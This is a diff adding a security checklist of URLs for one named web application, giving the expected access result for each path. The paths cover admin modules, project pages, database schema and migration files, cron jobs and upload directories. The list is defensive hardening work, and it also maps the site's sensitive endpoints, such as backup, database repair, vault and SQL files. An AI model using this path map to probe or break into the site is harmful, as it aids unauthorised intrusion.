+https://athenaeumtransformation.com/includes/templates/email/project_assignment.html | 403 Forbidden
+https://athenaeumtransformation.com/includes/templates/email/revocation_notification.php | 403 Forbidden
+
+--------------------------------------------------------------------------------
+MODULES - AUTH
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/modules/auth/login.php                       | Login page (OK - public)
+https://athenaeumtransformation.com/modules/auth/logout.php                      | Redirect to login
+https://athenaeumtransformation.com/modules/auth/force_reset.php                 | Redirect to login (not directly accessible)
+
+--------------------------------------------------------------------------------
+MODULES - ADMIN (must redirect to login if not authenticated)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/modules/admin/active_sessions.php            | Login redirect
+https://athenaeumtransformation.com/modules/admin/availability_status_master.php | Login redirect
+https://athenaeumtransformation.com/modules/admin/backup.php                     | Login redirect (CRITICAL)
+https://athenaeumtransformation.com/modules/admin/bulk_hours_management.php      | Login redirect
+https://athenaeumtransformation.com/modules/admin/calendar.php                   | Login redirect
+https://athenaeumtransformation.com/modules/admin/client_permissions.php         | Login redirect
+https://athenaeumtransformation.com/modules/admin/client_users.php               | Login redirect
+https://athenaeumtransformation.com/modules/admin/clients.php                    | Login redirect
+https://athenaeumtransformation.com/modules/admin/dashboard.php                  | Login redirect
+https://athenaeumtransformation.com/modules/admin/device_permissions.php         | Login redirect
+https://athenaeumtransformation.com/modules/admin/devices.php                    | Login redirect
+https://athenaeumtransformation.com/modules/admin/edit_requests.php              | Login redirect
+https://athenaeumtransformation.com/modules/admin/env_status_master.php          | Login redirect
+https://athenaeumtransformation.com/modules/admin/environments.php               | Login redirect
+https://athenaeumtransformation.com/modules/admin/feedbacks.php                  | Login redirect
+https://athenaeumtransformation.com/modules/admin/hours_compliance.php           | Login redirect
+https://athenaeumtransformation.com/modules/admin/issue_config.php               | Login redirect
+https://athenaeumtransformation.com/modules/admin/issue_statuses.php             | Login redirect
+https://athenaeumtransformation.com/modules/admin/login_activity.php             | Login redirect
+https://athenaeumtransformation.com/modules/admin/manage_hours.php               | Login redirect
+https://athenaeumtransformation.com/modules/admin/manage_statuses.php            | Login redirect
+https://athenaeumtransformation.com/modules/admin/page_qa_status_master.php      | Login redirect
+https://athenaeumtransformation.com/modules/admin/page_testing_status_master.php | Login redirect
+https://athenaeumtransformation.com/modules/admin/pdf_export_template.php        | Login redirect
+https://athenaeumtransformation.com/modules/admin/performance.php                | Login redirect
+https://athenaeumtransformation.com/modules/admin/phase_master.php               | Login redirect
+https://athenaeumtransformation.com/modules/admin/production_logs.php            | Login redirect
+https://athenaeumtransformation.com/modules/admin/project_specific_permissions.php | Login redirect
+https://athenaeumtransformation.com/modules/admin/projects.php                   | Login redirect
+https://athenaeumtransformation.com/modules/admin/qa_status_master.php           | Login redirect
+https://athenaeumtransformation.com/modules/admin/qa_status_permissions.php      | Login redirect
+https://athenaeumtransformation.com/modules/admin/repair_db.php                  | 403 Forbidden in production (CRITICAL)
+https://athenaeumtransformation.com/modules/admin/reports.php                    | Login redirect
+https://athenaeumtransformation.com/modules/admin/resource_workload.php          | Login redirect
+https://athenaeumtransformation.com/modules/admin/resource_workload_permissions.php | Login redirect
+https://athenaeumtransformation.com/modules/admin/uploads_manager.php            | Login redirect
+https://athenaeumtransformation.com/modules/admin/user_performance.php           | Login redirect
+https://athenaeumtransformation.com/modules/admin/users.php                      | Login redirect
+https://athenaeumtransformation.com/modules/admin/vault.php                      | Login redirect
+
+--------------------------------------------------------------------------------
+MODULES - PROJECTS
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/modules/projects/actions.php                 | Login redirect
+https://athenaeumtransformation.com/modules/projects/add_page.php                | Login redirect
+https://athenaeumtransformation.com/modules/projects/archive.php                 | Login redirect
+https://athenaeumtransformation.com/modules/projects/assets_list.php             | Login redirect
+https://athenaeumtransformation.com/modules/projects/bulk_assign.php             | Login redirect
+https://athenaeumtransformation.com/modules/projects/create.php                  | Login redirect
+https://athenaeumtransformation.com/modules/projects/delete.php                  | Login redirect
+https://athenaeumtransformation.com/modules/projects/duplicate.php               | Login redirect
+https://athenaeumtransformation.com/modules/projects/edit.php                    | Login redirect
+https://athenaeumtransformation.com/modules/projects/export_issues.php           | Login redirect
+https://athenaeumtransformation.com/modules/projects/handle_asset.php            | Login redirect
+https://athenaeumtransformation.com/modules/projects/issues.php                  | Login redirect
+https://athenaeumtransformation.com/modules/projects/issues_all.php              | Login redirect
+https://athenaeumtransformation.com/modules/projects/issues_common.php           | Login redirect
+https://athenaeumtransformation.com/modules/projects/issues_page_detail.php      | Login redirect
+https://athenaeumtransformation.com/modules/projects/issues_pages.php            | Login redirect
+https://athenaeumtransformation.com/modules/projects/manage_assignments.php      | Login redirect
+https://athenaeumtransformation.com/modules/projects/my_client_projects.php      | Login redirect
+https://athenaeumtransformation.com/modules/projects/phases.php                  | Login redirect
+https://athenaeumtransformation.com/modules/projects/upload_pages.php            | Login redirect
+https://athenaeumtransformation.com/modules/projects/view.php                    | Login redirect
+https://athenaeumtransformation.com/modules/projects/partials/issues_modals.php  | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/modals.php         | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_activity.php   | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_assets.php     | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_feedback.php   | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_issues.php     | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_pages.php      | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_performance.php | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_phases.php     | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_production_hours.php | 403 Forbidden
+https://athenaeumtransformation.com/modules/projects/partials/tab_team.php       | 403 Forbidden
+
+--------------------------------------------------------------------------------
+MODULES - OTHER ROLES
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/modules/at_tester/dashboard.php              | Login redirect
+https://athenaeumtransformation.com/modules/at_tester/my_projects.php            | Login redirect
+https://athenaeumtransformation.com/modules/at_tester/project_tasks.php          | Login redirect
+https://athenaeumtransformation.com/modules/at_tester/test_history.php           | Login redirect
+https://athenaeumtransformation.com/modules/ft_tester/dashboard.php              | Login redirect
+https://athenaeumtransformation.com/modules/ft_tester/my_projects.php            | Login redirect
+https://athenaeumtransformation.com/modules/ft_tester/project_tasks.php          | Login redirect
+https://athenaeumtransformation.com/modules/ft_tester/test_history.php           | Login redirect
+https://athenaeumtransformation.com/modules/qa/dashboard.php                     | Login redirect
+https://athenaeumtransformation.com/modules/qa/my_projects.php                   | Login redirect
+https://athenaeumtransformation.com/modules/qa/page_assignment.php               | Login redirect
+https://athenaeumtransformation.com/modules/qa/qa_tasks.php                      | Login redirect
+https://athenaeumtransformation.com/modules/project_lead/assignments.php         | Login redirect
+https://athenaeumtransformation.com/modules/project_lead/dashboard.php           | Login redirect
+https://athenaeumtransformation.com/modules/project_lead/my_projects.php         | Login redirect
+https://athenaeumtransformation.com/modules/project_lead/team_assignment.php     | Login redirect
+https://athenaeumtransformation.com/modules/reports/dashboard.php                | Login redirect
+https://athenaeumtransformation.com/modules/reports/export.php                   | Login redirect
+https://athenaeumtransformation.com/modules/calendar.php                         | Login redirect
+https://athenaeumtransformation.com/modules/chat/page_chat.php                   | Login redirect
+https://athenaeumtransformation.com/modules/chat/project_chat.php                | Login redirect
+https://athenaeumtransformation.com/modules/client/dashboard.php                 | Login redirect
+https://athenaeumtransformation.com/modules/client/dashboard_unified.php         | Login redirect
+https://athenaeumtransformation.com/modules/client/preferences.php               | Login redirect
+https://athenaeumtransformation.com/modules/client/project_dashboard.php         | Login redirect
+https://athenaeumtransformation.com/modules/client/projects.php                  | Login redirect
+https://athenaeumtransformation.com/modules/devices.php                          | Login redirect
+https://athenaeumtransformation.com/modules/feedback.php                         | Login redirect
+https://athenaeumtransformation.com/modules/generic_tasks/add_task.php           | Login redirect
+https://athenaeumtransformation.com/modules/generic_tasks/index.php              | Login redirect
+https://athenaeumtransformation.com/modules/generic_tasks/manage_categories.php  | Login redirect
+https://athenaeumtransformation.com/modules/my_daily_status.php                  | Login redirect
+https://athenaeumtransformation.com/modules/notifications.php                    | Login redirect
+https://athenaeumtransformation.com/modules/profile.php                          | Login redirect
+
+--------------------------------------------------------------------------------
+DATABASE FILES (must be blocked - CRITICAL)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/database/schema.sql                          | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/database/schema_live.sql                     | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/database/migrate.php                         | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/database/run_migration.php                   | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/database/run_client_migration.php            | 403 Forbidden (CRITICAL)
+https://athenaeumtransformation.com/database/migrations/add_account_setup_tracking.sql      | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_chat_read_tracking.sql          | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_client_dashboard_access.sql     | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_client_project_permissions.sql  | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_client_ready_field.sql          | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_client_reporting_system.sql     | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_login_attempts.sql              | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/add_performance_indexes.sql         | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/consolidated_migration_20260313.sql | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/convert_to_project_permissions.sql  | 403 Forbidden
+https://athenaeumtransformation.com/database/migrations/fix_edit_request_status.sql         | 403 Forbidden
+
+--------------------------------------------------------------------------------
+CRON FILES (must be blocked)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/cron/check_daily_hours.php                   | 403 Forbidden
+
+--------------------------------------------------------------------------------
+SCRIPTS (vendor files - should be blocked or not publicly accessible)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/scripts/deep_a11y_scan.js                    | 403 Forbidden
+https://athenaeumtransformation.com/scripts/vendor/axe.min.js                    | 403 Forbidden
+https://athenaeumtransformation.com/scripts/vendor/axe-core/axe.js               | 403 Forbidden
+https://athenaeumtransformation.com/scripts/vendor/axe-core/axe.min.js           | 403 Forbidden
+
+--------------------------------------------------------------------------------
+STORAGE & UPLOAD DIRECTORIES (directory listing must be blocked)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/storage/                                     | 403 Forbidden (no listing)
+https://athenaeumtransformation.com/uploads/                                     | 403 Forbidden (no listing)
+https://athenaeumtransformation.com/uploads/chat/                                 | 403 Forbidden (no listing)
+https://athenaeumtransformation.com/uploads/issues/                               | 403 Forbidden (no listing)
+https://athenaeumtransformation.com/assets/uploads/                               | 403 Forbidden (no listing)
+https://athenaeumtransformation.com/assets/uploads/automated_findings/           | 403 Forbidden (no listing)
+
+--------------------------------------------------------------------------------
+PUBLIC ASSETS (these SHOULD be accessible - verify they load correctly)
+--------------------------------------------------------------------------------
+https://athenaeumtransformation.com/assets/css/style.css                         | 200 OK (CSS loads)
+https://athenaeumtransformation.com/assets/css/dashboard.css                     | 200 OK (CSS loads)
+https://athenaeumtransformation.com/assets/css/header-fix.css                    | 200 OK (CSS loads)
+https://athenaeumtransformation.com/assets/js/dashboard.js                       | 200 OK (JS loads)
+https://athenaeumtransformation.com/assets/js/login-activity.js                  | 200 OK (JS loads)
+
+================================================================================
+END OF FILE URL LIST
+================================================================================
